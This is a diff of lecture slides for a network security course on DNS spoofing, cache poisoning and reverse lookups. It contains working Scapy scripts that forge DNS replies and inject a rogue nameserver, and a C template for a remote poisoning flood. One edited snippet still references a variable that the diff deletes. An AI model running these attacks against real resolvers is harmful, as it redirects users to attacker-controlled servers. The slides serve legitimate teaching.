@@ -701,19 +701,19 @@ while True:
 
   # answer section: we always return 10.2.3.6
   Anssec = DNSRR(rrname=DNSreq.qd.qname, type='A',
-                 rdata='10.2.3.6', ttl=259200)
+                 rdata='10.2.3.6', ttl=86400)
 
   # two authority sections: other NS to ask
   NSsec1 = DNSRR(rrname="example.com", type='NS',
-                 rdata='ns1.example.com', ttl=259200)
+                 rdata='ns1.example.com', ttl=86400)
   NSsec2 = DNSRR(rrname="example.com", type='NS',
-                 rdata='ns2.example.com', ttl=259200)
+                 rdata='ns2.example.com', ttl=86400)
 
   ## additional sections: more info, such as the NS IPs
   Addsec1 = DNSRR(rrname='ns1.example.com', type='A',
-                 rdata='10.2.3.1', ttl=259200) 
+                 rdata='10.2.3.1', ttl=86400) 
   Addsec2 = DNSRR(rrname='ns2.example.com', type='A',
-                 rdata='10.2.3.2', ttl=259200) 
+                 rdata='10.2.3.2', ttl=86400) 
 
   # combine all these into a single DNS packet
   DNSpkt = DNS(id=DNSreq.id, aa=1, rd=0, qr=1,
@@ -744,15 +744,15 @@ $ dig @localhost -p 1053 www.example.com
 ;www.example.com.   IN  A
 
 ;; ANSWER SECTION:
-www.example.com.  259200  IN  A 10.2.3.6
+www.example.com.  86400  IN  A 10.2.3.6
 
 ;; AUTHORITY SECTION:
-example.com.    259200  IN  NS  ns1.example.com.
-example.com.    259200  IN  NS  ns2.example.com.
+example.com.    86400  IN  NS  ns1.example.com.
+example.com.    86400  IN  NS  ns2.example.com.
 
 ;; ADDITIONAL SECTION:
-ns1.example.com.  259200  IN  A 10.2.3.1
-ns2.example.com.  259200  IN  A 10.2.3.2
+ns1.example.com.  86400  IN  A 10.2.3.1
+ns2.example.com.  86400  IN  A 10.2.3.2
 
 ;; Query time: 4 msec
 ;; SERVER: 127.0.0.1#1053(127.0.0.1)
@@ -791,7 +791,7 @@ On the local machine (1), between the resolver and the local machine (2), betwee
 
 
 <!-- .slide: class="right-float-img-600" -->
-<h2 class="r-fit-text">2: DNS Attacks Between Resolver</h2>
+## 2: DNS Attacks on Host
 
 [![](http://www.cs.virginia.edu/~asb2t/duimg/n10/image32.png)](http://www.cs.virginia.edu/~asb2t/duimg/n10/image32.png)
 - When the local machine sends out a query to the DNS server
@@ -802,7 +802,7 @@ On the local machine (1), between the resolver and the local machine (2), betwee
 
 
 
-<h2 class="r-fit-text">2: DNS Attacks Between Resolver</h2>
+## 2: DNS Attacks on Host
 
 [![](http://www.cs.virginia.edu/~asb2t/duimg/n10/image33.png)](http://www.cs.virginia.edu/~asb2t/duimg/n10/image33.png)
 - When a DNS query is launched from the user's machine to the DNS server, immediately send a spoofed reply
@@ -811,7 +811,7 @@ On the local machine (1), between the resolver and the local machine (2), betwee
 
 
 <!-- .slide: class="small-pre" -->
-## DNS Spoof Attack
+## DNS Spoof Attack on Host
 ```python
 #!/usr/bin/env python3
 from scapy.all import *
@@ -823,23 +823,21 @@ def spoof_dns(pkt):
      UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
 
      Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
-                    rdata='1.2.3.4', ttl=259200)
-     NSsec  = DNSRR(rrname="example.com", type='NS',
-                    rdata='ns.attacker32.com', ttl=259200)
+                    rdata='1.2.3.4', ttl=86400)
      DNSpkt = DNS(id=pkt[DNS].id, aa=1, rd=0,
-                  qdcount=1, qr=1, ancount=1, nscount=1,
+                  qdcount=1, qr=1, ancount=1, 
                   qd=pkt[DNS].qd, an=Anssec, ns=NSsec)
 
      spoofpkt = IPpkt/UDPpkt/DNSpkt
      send(spoofpkt)
 
 f = 'udp and (src host 10.9.0.53 and dst port 53)'
-pkt=sniff(iface='eth0', filter=f, prn=spoof_dns)
+pkt=sniff(iface='eth1', filter=f, prn=spoof_dns)
 ```
 
 
 
-<h2 class="r-fit-text">DNS Spoof Attack `nslookup` Output</h2>
+<h2 class="r-fit-text">DNS Spoof Attack <code>nslookup</code> Output</h2>
 
 ```text
 root@outer1:/# nslookup example.com
@@ -885,11 +883,12 @@ root@outer1:/#
 
 
 
+<!-- .slide: class="right-float-img-600 small-pre" -->
 ## DNS Timing Issues
+[![](../docker/network_compact.svg)](../docker/network_compact.svg)
 - Scapy is slow, networks are fast
 - On the Docker containers, sometimes the DNS reply comes in before Scapy can send the spoof
-- Solution: cause the Internet link to be slow via the `tc` command
-  - This is done on *firewall*
+- Solution: cause the Internet link to be slow via the `tc` command on *firewall*
 ```
 // add a delay to the eth0 interface
 tc qdisc add dev eth0 root netem delay 500ms
@@ -903,13 +902,13 @@ tc qdisc del dev eth0 root netem
 
 
 
-<h2 class="r-fit-text">Targeting the Authority Section</h2>
-
-- A DNS spoof attack would also target the *authority* section
-  - The authoritative nameserver for the domain
-- So if example.com were spoofed, a fake sub-domain (ns.example.com) would be registered as the authority
-  - Along with an IP address of a malicious nameserver
-- Then any query to *.example.com will use that (malicious) nameserver
+## This only works the first time
+- The first time example.com is queried, the *firewall* nameserver sends a message out to the Internet to get the mapping
+  - Possibly with a delay
+  - But allowing Scapy to send the spoofed packet
+- The the *real* mapping is in the DNS cache
+  - And this the response is very quick the second time around
+- Solution: modify the DNS cache
 
 
 
@@ -919,8 +918,8 @@ tc qdisc del dev eth0 root netem
 - When the DNS server doesn't know a mapping, it queries other DNS servers
   - Starting with the root nameservers
 - Send a spoofed reply before the real reply comes in
-- This reply will stay in the DNS server's cache
-  - Poisoning it
+  - To the DNS, not the requesting host machine
+- This reply will stay in the DNS server's cache, poisoning it
 
 
 
@@ -944,12 +943,79 @@ tc qdisc del dev eth0 root netem
 <!-- .slide: class="right-float-img-600" -->
 ## DNS Attack Differences
 [![](http://www.cs.virginia.edu/~asb2t/duimg/n10/image32.png)](http://www.cs.virginia.edu/~asb2t/duimg/n10/image32.png)
-- 2: DNS Attacks Between Resolver
+- 2: DNS Attacks on Host
   - This attack must occur *each* time a machine queries that address
     - And some machines may not have much of a DNS cache
 - 3: DNS Cache Poisoning Attack
   - This attack has the data staying in the DNS cache
     - So only has to occur once (for a 24 hour period)
+
+
+
+<h2 class="r-fit-text">Targeting the Authority Section</h2>
+
+- A DNS spoof attack would also target the *authority* section
+  - The authoritative nameserver for the domain
+- So if example.com were spoofed, a fake sub-domain (ns.example.com) would be registered as the authority
+  - Along with an IP address of a malicious nameserver
+- Then any query to *.example.com will use that (malicious) nameserver
+
+
+
+<!-- .slide: class="small-pre" -->
+<h2 class="r-fit-text">DNS Spoof Poisoning Attack w/NS</h2>
+
+```python
+#!/usr/bin/env python3
+from scapy.all import *
+
+def spoof_dns(pkt):
+  if(DNS in pkt and 'www.example.com' in 
+                    pkt[DNS].qd.qname.decode('utf-8')):
+     IPpkt  = IP(dst=pkt[IP].src,  src=pkt[IP].dst)
+     UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
+
+     Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
+                    rdata='1.2.3.4', ttl=86400)
+     NSsec  = DNSRR(rrname="example.com", type='NS',
+                    rdata='ns.attacker32.com', ttl=86400)
+     DNSpkt = DNS(id=pkt[DNS].id, aa=1, rd=0,
+                  qdcount=1, qr=1, ancount=1, nscount=1,
+                  qd=pkt[DNS].qd, an=Anssec, ns=NSsec)
+
+     spoofpkt = IPpkt/UDPpkt/DNSpkt
+     send(spoofpkt)
+
+f = 'udp and (src host 10.9.0.53 and dst port 53)'
+pkt=sniff(iface='eth0', filter=f, prn=spoof_dns)
+```
+
+
+
+<!-- .slide: class="small-pre" -->
+<h2 class="r-fit-text">DNS Spoof Poisoning Attack w/NS</h2>
+
+In the DNS cache:
+```text
+# dig NS example.com
+
+;; QUESTION SECTION:
+example.com.                      IN   NS
+
+;; ANSWER SECTION:
+example.com.            172204    IN   NS    ns.attacker32.com
+```
+Example usage:
+```text
+$ dig xyz.example.com
+;; ANSWER SECTION:
+xyz.example.com     86400     IN A   1.2.3.6
+
+$ dig abc.example.com
+;; ANSWER SECTION:
+abc.example.com     86400     IN A   1.2.3.6
+```
+Here, 1.2.3.6 is what the malicious nameserver returns
 
 
 
@@ -965,7 +1031,262 @@ tc qdisc del dev eth0 root netem
 
 
 
-## End of prepared slides
+## More Cache, More Problems
+- We have a 1 in a $2^{32}$ (about 4.3 billion) chance of guessing the right numbers
+  - UDP source port and DNS transaction ID
+  - Incorrect values will cause the spoofed reply to be ignored
+- If we guess it wrong, the correct one will arrive, and stay in cache
+  - For one or more days
+- So we can't try again until we wait...
+
+
+
+## Remote DNS Cache Poisoning
+- In order to perform a remote DNS cache poisoning attack, we have to perform three steps:
+  1. Trigger the victim machine to perform a DNS query
+  2. Negate the cache effect
+  3. Spoof the reply
+- We are going to do this for a *sub-*domain of example.com
+
+
+
+## Step 1: Trigger the DNS query
+- Perhaps we have a user (non-root) account on that machine
+  - Then `nslookup foo.example.com` will do it
+- Maybe we control a website that users in that organization frequent
+  - Try to load an image from foo.example.com
+- Send a email that includes a link or embedded image
+- The list goes on and on...
+
+
+
+## Step 2: Negate the cache effect
+- We query various random sub-domains of example.com
+  - We assume a example.com nameserver is not included in the initial example.com query
+  - If it is, pick a different domain
+- Each new sub-domain will not be in cache
+  - It will save the response in cache, but we'll use a different sub-domain next time
+- Thus, the cache effect is negated
+
+
+
+<!-- .slide: class="right-float-img-600" -->
+## Step 3: Spoof the reply
+![](http://www.cs.virginia.edu/~asb2t/duimg/n10/image34.png)
+- We don't know the UDP port number nor the DNS transaction ID
+  - Guessing them is a 1 in $2^{32}$ chance of success
+- We flood the DNS server with spoofed responses
+  - Maybe one will work
+- If unsuccessful, try a new random sub-domain, and repeat the flood
+- Eventually one will work
+
+
+
+
+## Remote DNS Cache Poisoning
+[![](http://www.cs.virginia.edu/~asb2t/duimg/n10/image40.png)](http://www.cs.virginia.edu/~asb2t/duimg/n10/image40.png)
+
+
+
+## We set the authority
+- Eventually a response will make it in
+- That response will also include an authority section
+  - Setting a malicious nameserver as the nameserver for *.example.com
+- Only a response that makes it in
+  - And responds to the query (via answer or authority)
+  - Will be accepted, and we can add the authority section to that
+- A query to another sub-domain can then cause real damage
+  - We'll see this shortly
+
+
+
+<!-- .slide: class="small-pre" -->
+## Scapy code to create a template
+```python
+#!/bin/env python3
+
+from scapy.all import *
+
+# We are targeting the example.com domain.
+targetName   = 'aaaaa.example.com'
+targetDomain = 'example.com'
+
+# The objective of the attack is to get the targeted local
+# DNS server to use the following name as the nameserver
+# for the example.com domain. 
+attackerNS = 'ns.attacker32.com'
+
+# dstIP is the IP address of the targeted local DNS server.
+# srcIP can be address, because it will be replaced with
+# the IP address of example.com's actual name server. 
+dstIP = '10.9.0.53' 
+srcIP = '1.2.3.4' 
+
+# Construct the IP and UDP header 
+ip  = IP (dst = dstIP, src = srcIP)
+
+# Set the checksum filed to zero. If this field is not set,
+# Scapy will calculate checksum for us. Since the UDP packet
+# will be modified later, this checksum will become invalid. 
+# Setting this field to zero means ignoring checksum (supported by UDP).
+# Scapy will not do the calculation for us if the field is already set.
+udp = UDP(dport = 33333, sport = 53,  chksum=0)
+
+# Construct the Question section
+# The C code will modify the qname field
+Qdsec  = DNSQR(qname  = targetName)
+
+# Construct the Answer section (the answer can be anything)
+# The C code will modify the rrname field
+Anssec = DNSRR(rrname = targetName,  
+               type   = 'A', 
+               rdata  = '1.1.1.1', 
+               ttl    = 259200)
+
+# Construct the Authority section (the main goal of the attack) 
+NSsec  = DNSRR(rrname = targetDomain, 
+               type   = 'NS', 
+               rdata  = attackerNS, 
+               ttl    = 259200)
+
+# Construct the DNS part 
+# The C code will modify the id field
+dns    = DNS(id  = 0xAAAA, aa=1, rd=1, qr=1, 
+             qdcount = 1, qd = Qdsec, 
+             ancount = 1, an = Anssec, 
+             nscount = 1, ns = NSsec)
+
+# Construct the IP packet and save it to a file.
+Replypkt = ip/udp/dns
+with open('ip_resp.bin', 'wb') as f:
+    f.write(bytes(Replypkt))
+```
+
+
+
+<!-- .slide: class="small-pre" -->
+## C code to launch the attack
+```c
+#include <stdlib.h>
+#include <arpa/inet.h>
+#include <string.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <time.h>
+
+#define MAX_FILE_SIZE 1000000
+
+
+/* IP Header */
+struct ipheader {
+  unsigned char      iph_ihl:4, //IP header length
+                     iph_ver:4; //IP version
+  unsigned char      iph_tos; //Type of service
+  unsigned short int iph_len; //IP Packet length (data + header)
+  unsigned short int iph_ident; //Identification
+  unsigned short int iph_flag:3, //Fragmentation flags
+                     iph_offset:13; //Flags offset
+  unsigned char      iph_ttl; //Time to Live
+  unsigned char      iph_protocol; //Protocol type
+  unsigned short int iph_chksum; //IP datagram checksum
+  struct  in_addr    iph_sourceip; //Source IP address 
+  struct  in_addr    iph_destip;   //Destination IP address 
+};
+
+void send_raw_packet(char * buffer, int pkt_size);
+void send_dns_request( );
+void send_dns_response( );
+
+int main()
+{
+  srand(time(NULL));
+
+  // Load the DNS request packet from file
+  FILE * f_req = fopen("ip_req.bin", "rb");
+  if (!f_req) {
+     perror("Can't open 'ip_req.bin'");
+     exit(1);
+  }
+  unsigned char ip_req[MAX_FILE_SIZE];
+  int n_req = fread(ip_req, 1, MAX_FILE_SIZE, f_req);
+
+  // Load the first DNS response packet from file
+  FILE * f_resp = fopen("ip_resp.bin", "rb");
+  if (!f_resp) {
+     perror("Can't open 'ip_resp.bin'");
+     exit(1);
+  }
+  unsigned char ip_resp[MAX_FILE_SIZE];
+  int n_resp = fread(ip_resp, 1, MAX_FILE_SIZE, f_resp);
+
+  char a[26]="abcdefghijklmnopqrstuvwxyz";
+  while (1) {
+    // Generate a random name with length 5
+    char name[5];
+    for (int k=0; k<5; k++)  name[k] = a[rand() % 26];
+
+    //##################################################################
+    /* Step 1. Send a DNS request to the targeted local DNS server.
+               This will trigger the DNS server to send out DNS queries */
+
+    // ... Students should add code here.
+
+
+    /* Step 2. Send many spoofed responses to the targeted local DNS server,
+               each one with a different transaction ID. */
+    
+    // ... Students should add code here.
+    
+    //##################################################################
+  }
+}
+
+
+/* Use for sending DNS request.
+ * Add arguments to the function definition if needed.
+ * */
+void send_dns_request()
+{
+  // Students need to implement this function
+}
+
+
+/* Use for sending forged DNS response.
+ * Add arguments to the function definition if needed.
+ * */
+void send_dns_response()
+{
+  // Students need to implement this function
+}
+
+
+/* Send the raw packet out 
+ *    buffer: to contain the entire IP packet, with everything filled out.
+ *    pkt_size: the size of the buffer.
+ * */
+void send_raw_packet(char * buffer, int pkt_size)
+{
+  struct sockaddr_in dest_info;
+  int enable = 1;
+
+  // Step 1: Create a raw network socket.
+  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+
+  // Step 2: Set socket option.
+  setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
+       &enable, sizeof(enable));
+
+  // Step 3: Provide needed information about destination.
+  struct ipheader *ip = (struct ipheader *) buffer;
+  dest_info.sin_family = AF_INET;
+  dest_info.sin_addr = ip->iph_destip;
+
+  // Step 4: Send the packet out.
+  sendto(sock, buffer, pkt_size, 0,
+       (struct sockaddr *)&dest_info, sizeof(dest_info));
+  close(sock);
+}
+```
 
 
 
@@ -979,8 +1300,318 @@ tc qdisc del dev eth0 root netem
 
 
 
-[![](http://www.cs.virginia.edu/~asb2t/duimg/n10/image40.png)](http://www.cs.virginia.edu/~asb2t/duimg/n10/image40.png)
+## Fake data in the Answer section
+- That's easy: just redirect certain domains to malicious servers
 
+
+
+<h2 class="r-fit-text">Fake data in the Additional section</h2>
+
+- Consider fake data sent in the Additional section:
+```text
+;; QUESTION SECTION:
+;abc.example.com              IN A
+
+;; ANSWER SECTION:
+abc.example.com     86400     IN A   1.2.3.4
+
+;; ADDITIONAL SECTION:
+www.example.com     86400     IN A   1.2.3.5
+instagram.com       86400     IN A   1.2.3.6
+```
+- We've now changed the IP address of instagram.com via our malicious nameserver
+  - Even though the query was for another sub-domain of example.com
+
+
+
+<!-- .slide: class="wide-pre small-pre" -->
+<h2 class="r-fit-text">Scapy code to fake the Additional section</h2>
+
+```python
+#!/usr/bin/python
+from scapy.all import *
+
+def spoof_dns(pkt):
+  if (DNS in pkt and 'abc.example.com' in pkt[DNS].qd.qname):
+    IPpkt = IP(dst=pkt[IP].src,src=pkt[IP].dst)
+    UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
+
+    Anssec  = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
+                   rdata='1.2.3.4',ttl=259200)
+    Addsec1 = DNSRR(rrname='www.example.com', type='A',
+                   ttl=259200, rdata='1.2.3.5')
+    Addsec2 = DNSRR(rrname='instagram.com', type='A',
+                    ttl=259200,rdata='1.2.3.6')
+    DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1,rd=0,
+                 qdcount=1,qr=1,ancount=1,nscount=0,arcount=2,
+                 an=Anssec, ar=Addsec1/Addsec2)
+    spoofpkt = IPpkt/UDPpkt/DNSpkt
+    send(spoofpkt)
+
+pkt=sniff(filter='udp and (src host -.-.-.- and dst port 53)',
+          prn=spoof_dns) # fill in a real IP here
+```
+
+
+
+<h2 class="r-fit-text">Fake data in the Authority section</h2>
+
+- Consider fake data sent in the Additional section:
+```text
+;; QUESTION SECTION:
+;abc.example.com              IN A
+
+;; ANSWER SECTION:
+abc.example.com     86400     IN A   1.2.3.4
+
+;; AUTHORITY SECTION:
+example.com         86400     IN NS  ns.example.com
+instagram.com       86400     IN NS  ns.example.com
+```
+- We've now changed the *DNS server* of instagram.com via our malicious nameserver
+  - Even though the query was for another sub-domain of example.com
+
+
+
+<!-- .slide: class="wide-pre small-pre" -->
+<h2 class="r-fit-text">Scapy code to fake the Authority section</h2>
+
+```python
+#!/usr/bin/python
+from scapy.all import *
+
+def spoof_dns(pkt):
+  if (DNS in pkt and 'abc.example.com' in pkt[DNS].qd.qname):
+    IPpkt = IP(dst=pkt[IP].src,src=pkt[IP].dst)
+    UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
+
+    Anssec  = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
+                   rdata='1.2.3.4',ttl=259200)
+    # only the next three have changed
+    NSSec1 = DNSRR(rrname='example.com', type='NS',
+                   ttl=259200, rdata='ns.example.com')
+    NSSec2 = DNSRR(rrname='instagram.com', type='NS',
+                    ttl=259200,rdata='ns.example.com')
+    DNSpkt = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1,rd=0,
+                 qdcount=1,qr=1,ancount=1,nscount=2,arcount=0,
+                 an=Anssec, ns=NSSec1/NSSec2)
+    spoofpkt = IPpkt/UDPpkt/DNSpkt
+    send(spoofpkt)
+
+pkt=sniff(filter='udp and (src host -.-.-.- and dst port 53)',
+          prn=spoof_dns) # fill in a real IP here
+```
+
+
+
+<h2 class="r-fit-text">Fake Authority <i>and</i> Additional sections</h2>
+
+```text
+;; QUESTION SECTION:
+;abc.example.com              IN A
+
+;; ANSWER SECTION:
+abc.example.com     86400     IN A   1.2.3.4
+
+;; AUTHORITY SECTION:
+example.com         86400     IN NS  ns.example.com
+example.com         86400     IN NS  instagram.com
+
+;; ADDITIONAL SECTION:
+ns.example.com      86400     IN A   1.2.3.5
+instagram.com       86400     IN A   1.2.3.6
+```
+- This combines the previous two examples
+
+
+
+## Reverse DNS Lookup
+Consider:
+```text
+$ ping -c 1 portal.cs.virginia.edu
+PING portal (128.143.69.114) 56(84) bytes of data.
+64 bytes from portal (128.143.69.114): icmp_seq=1 ttl=63 time=0.216 ms
+
+$ nslookup 128.143.69.114
+114.69.143.128.in-addr.arpa name = portal.
+114.69.143.128.in-addr.arpa name = portal.cs.virginia.edu.
+
+$ 
+```
+- The first is a standard DNS lookup
+- The second is a reverse DNS lookup
+
+
+
+## Reverse DNS Lookup
+- Take the IP address: 128.143.69.114
+- Reverse it and add ".in-arpa.arpa"
+  - 114.69.143.128.in-arpa.arpa
+- This will:
+  - Query the in-arpa.arpa server
+  - Which directs it to the 128.in-arpa.arpa server
+  - Which directs it to the 143.128.in-arpa.arpa.server (that's UVA)
+  - Which directs it to the actual nameserver for UVA
+
+
+
+
+<!-- .slide: class="wide-pre" -->
+## Reverse DNS Lookup
+```text
+$ dig @a.root-servers.net -x 128.143.69.114
+
+; <<>> DiG 9.18.18-0ubuntu0.22.04.2-Ubuntu <<>> @a.root-servers.net -x 128.143.69.114
+; (2 servers found)
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 7066
+;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 6, ADDITIONAL: 13
+;; WARNING: recursion requested but not available
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+;; QUESTION SECTION:
+;114.69.143.128.in-addr.arpa. IN  PTR
+
+;; AUTHORITY SECTION:
+in-addr.arpa.   172800  IN  NS  e.in-addr-servers.arpa.
+in-addr.arpa.   172800  IN  NS  f.in-addr-servers.arpa.
+in-addr.arpa.   172800  IN  NS  d.in-addr-servers.arpa.
+in-addr.arpa.   172800  IN  NS  c.in-addr-servers.arpa.
+in-addr.arpa.   172800  IN  NS  b.in-addr-servers.arpa.
+in-addr.arpa.   172800  IN  NS  a.in-addr-servers.arpa.
+
+;; ADDITIONAL SECTION:
+e.in-addr-servers.arpa. 172800  IN  A 203.119.86.101
+e.in-addr-servers.arpa. 172800  IN  AAAA  2001:dd8:6::101
+f.in-addr-servers.arpa. 172800  IN  A 193.0.9.1
+f.in-addr-servers.arpa. 172800  IN  AAAA  2001:67c:e0::1
+d.in-addr-servers.arpa. 172800  IN  A 200.10.60.53
+d.in-addr-servers.arpa. 172800  IN  AAAA  2001:13c7:7010::53
+c.in-addr-servers.arpa. 172800  IN  A 196.216.169.10
+c.in-addr-servers.arpa. 172800  IN  AAAA  2001:43f8:110::10
+b.in-addr-servers.arpa. 172800  IN  A 199.253.183.183
+b.in-addr-servers.arpa. 172800  IN  AAAA  2001:500:87::87
+a.in-addr-servers.arpa. 172800  IN  A 199.180.182.53
+a.in-addr-servers.arpa. 172800  IN  AAAA  2620:37:e000::53
+
+;; Query time: 4 msec
+;; SERVER: 198.41.0.4#53(a.root-servers.net) (UDP)
+;; WHEN: Thu Mar 21 22:53:29 EDT 2024
+;; MSG SIZE  rcvd: 432
+```
+
+
+
+<!-- .slide: class="wide-pre" -->
+## Reverse DNS Lookup
+```text
+$ dig @a.in-addr-servers.arpa -x 128.143.69.114
+
+; <<>> DiG 9.18.18-0ubuntu0.22.04.2-Ubuntu <<>> @a.in-addr-servers.arpa -x 128.143.69.114
+; (2 servers found)
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 27384
+;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 6, ADDITIONAL: 1
+;; WARNING: recursion requested but not available
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 1232
+; COOKIE: 496a9c1901e66fca0100000065fcf2e8914858f3646f9165 (good)
+;; QUESTION SECTION:
+;114.69.143.128.in-addr.arpa. IN  PTR
+
+;; AUTHORITY SECTION:
+128.in-addr.arpa. 86400 IN  NS  r.arin.net.
+128.in-addr.arpa. 86400 IN  NS  z.arin.net.
+128.in-addr.arpa. 86400 IN  NS  x.arin.net.
+128.in-addr.arpa. 86400 IN  NS  y.arin.net.
+128.in-addr.arpa. 86400 IN  NS  u.arin.net.
+128.in-addr.arpa. 86400 IN  NS  arin.authdns.ripe.net.
+
+;; Query time: 80 msec
+;; SERVER: 199.180.182.53#53(a.in-addr-servers.arpa) (UDP)
+;; WHEN: Thu Mar 21 22:54:32 EDT 2024
+;; MSG SIZE  rcvd: 223
+```
+
+
+
+<!-- .slide: class="wide-pre" -->
+## Reverse DNS Lookup
+```text
+$ dig @r.arin.net -x 128.143.69.114
+
+; <<>> DiG 9.18.18-0ubuntu0.22.04.2-Ubuntu <<>> @r.arin.net -x 128.143.69.114
+; (2 servers found)
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 56181
+;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 3, ADDITIONAL: 1
+;; WARNING: recursion requested but not available
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 1232
+; COOKIE: 9d6c591214760a530100000065fcf304b78df59879ace755 (good)
+;; QUESTION SECTION:
+;114.69.143.128.in-addr.arpa. IN  PTR
+
+;; AUTHORITY SECTION:
+143.128.in-addr.arpa. 86400 IN  NS  juno.acc.virginia.edu.
+143.128.in-addr.arpa. 86400 IN  NS  nom.virginia.edu.
+143.128.in-addr.arpa. 86400 IN  NS  uvaarpa.virginia.edu.
+
+;; Query time: 80 msec
+;; SERVER: 199.180.180.63#53(r.arin.net) (UDP)
+;; WHEN: Thu Mar 21 22:55:00 EDT 2024
+;; MSG SIZE  rcvd: 191
+```
+
+
+
+<!-- .slide: class="wide-pre" -->
+## Reverse DNS Lookup
+```text
+$ dig @uvaarpa.virginia.edu -x 128.143.69.114
+
+; <<>> DiG 9.18.18-0ubuntu0.22.04.2-Ubuntu <<>> @uvaarpa.virginia.edu -x 128.143.69.114
+; (1 server found)
+;; global options: +cmd
+;; Got answer:
+;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 30992
+;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 2, ADDITIONAL: 1
+;; WARNING: recursion requested but not available
+
+;; OPT PSEUDOSECTION:
+; EDNS: version: 0, flags:; udp: 4096
+; COOKIE: 8e5d984fc2fa6afc0100000065fcf31c09eb4527d631750c (good)
+;; QUESTION SECTION:
+;114.69.143.128.in-addr.arpa. IN  PTR
+
+;; AUTHORITY SECTION:
+69.143.128.in-addr.arpa. 3600 IN  NS  athena.cs.virginia.edu.
+69.143.128.in-addr.arpa. 3600 IN  NS  apollo.cs.virginia.edu.
+
+;; Query time: 0 msec
+;; SERVER: 128.143.107.117#53(uvaarpa.virginia.edu) (UDP)
+;; WHEN: Thu Mar 21 22:55:24 EDT 2024
+;; MSG SIZE  rcvd: 141
+```
+
+
+
+## What damage could this cause
+- If any security is based on the domain it came from
+  - An example close to home
+- One should generally not use this as a basis for security
+- But if you do, to be sure, do a forward lookup after obtaining the domain
+
+
+
+## End of prepared slides
+<!-- through section 10.8.5 of the textbook; sections 10.9+ left -->
 </textarea></section>
 
 </section>
@@ -1013,3 +1644,4 @@ tc qdisc del dev eth0 root netem
 <script src="settings.js"></script>
 </body>
 </html>
+
